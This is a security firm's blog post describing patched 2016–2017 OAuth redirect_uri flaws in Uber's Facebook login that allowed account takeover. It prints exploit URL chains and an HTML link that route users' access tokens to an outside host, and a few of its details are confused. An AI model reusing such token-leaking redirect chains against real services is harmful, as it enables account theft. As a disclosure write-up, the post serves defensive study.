---
layout: page
title: "Nova Security's Rigorous Vulnerability Assessment: A Case Study on Online Authentication Flaws"
date: 2024-06-12 11:21:29
description: At Nova Security, we pride ourselves on meticulous and methodical vulnerability assessment methodologies. Our approach allows us to intricately navigate through endpoints and comprehensively analyse potential vulnerabilities.
thumbnail: "../../assets/images/blogs/blog_image_1.webp"
author: Ron Chan
tags: ["Business", "Software","Agency"]
categories: [Penetration Testing, Bug Bounty, Cybersecurity]
bodyClass: blog-single
---

At Nova Security, we pride ourselves on meticulous and methodical vulnerability assessment methodologies. Our approach allows us to intricately navigate through endpoints and comprehensively analyse potential vulnerabilities.

Our rigorous security assessment includes a thorough examination of sites like uber.com, uberinternal.com. This involves analyzing approximately 15,000 requests per day in Burp. Our focus is not solely on reflective or stored XSS vulnerabilities, but we follow the flow of the website, especially if it uses OAuth, exploring various permutations of redirect_uris.

One such interesting observation is a lesser-known Facebook *redirect_uri* loophole. Back in 2016, Uber permitted Facebook login at login.uber.com and auth.uber.com, and the login flow allowed further redirection to *.uber.com. A peculiar feature of browser security is that a 302 location header redirect preserves any content after the hash in the URL. It provided an opportunity to exploit open redirect in the next_url parameter, which could potentially lead to access token theft.

One example of an enduring open redirect is https://login.uber.com/logout. It redirects based on the Referer header, which, in turn, can be manipulated.

By using the above-mentioned information, we were able to deduce an exploitative method to achieve Facebook Account Takeover (ATO) in Uber. The details of the exploit are provided in the link below:

`https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2fauth.uber.com%2flogin%3fnext_url=https%3A%2F%2Frush.uber.com%2Flogin%2F&state=m7QWxxPRNII4VGsCSog0xLJ2KF7e8ynpC2c_OAKkQQk%3D` (Clicking from https://novasecurity.co.nz/theft)

`https://auth.uber.com/login?next_url=https%3A%2F%2Frush.uber.com%2Flogin%2F&state=m7QWxxPRNII4VGsCSog0xLJ2KF7e8ynpC2c_OAKkQQk%3D#access_toekn=xxxx`

`https://rush.uber.com/login?&#8230;.#access_token=xxxx`

`https://novasecurity.co.nz/theft#access_token=xxxxx`

The exploit was reported in late 2016 and promptly fixed. It is encouraged to refer to the original fix implemented by Uber to understand the mechanism better.

On revisiting the issue in early 2017, we noticed that Uber still hosted two whitelisted redirect_uris - https://auth.uber.com/login and https://login.uber.com/login. Despite the initial open redirect issue being resolved, the existence of these whitelisted redirect_uris introduced a fresh set of exploitative possibilities.

Interestingly, the server accepted an encoded slash (%2f), leading to a successful exploitation of the bug. Combining Uber's server-side normalization behavior with Facebook's acceptance of double URL encoded slashes, we could devise another method to compromise Uber's Facebook account.

```html
redirect_uri=https%3a%2f%2fnovasecurity.co.nz%2fdirectory%252f..%252f..%252fescaped

<a href="https://facebook.com/xxxx?client_id=xxxxxx&redirect_uri=https%3a%2f%2flogin.uber.com%2flogin%252f..%252f..%252flogout&state=state">Click to leak</a>
```

The subsequent fix by Uber involved the removal of login.uber.com from the whitelist redirect_uri.

At Nova Security, we appreciate the complexity of the digital landscape and understand that every organization faces unique challenges. While our aforementioned exploration may seem intricate, it's just one example of the work we undertake daily. We relish these opportunities to delve into the depths of cyberspace, unearthing vulnerabilities, and formulating robust defensive strategies.

Our security experts stay on the frontline of cybersecurity, tracking new threats, and developing innovative countermeasures. However, we understand that cybersecurity is not a one-size-fits-all approach. That's why we strive to offer tailored services that address your organization's specific needs.

It's crucial to understand that robust cybersecurity is not a luxury but a necessity in today's digital age. Whether you're operating a startup or a multinational corporation, securing your digital assets should be a top priority.

If you have any queries, or if your organization requires an in-depth security assessment, please don't hesitate to contact us. We welcome the opportunity to discuss how our bespoke services can help safeguard your business.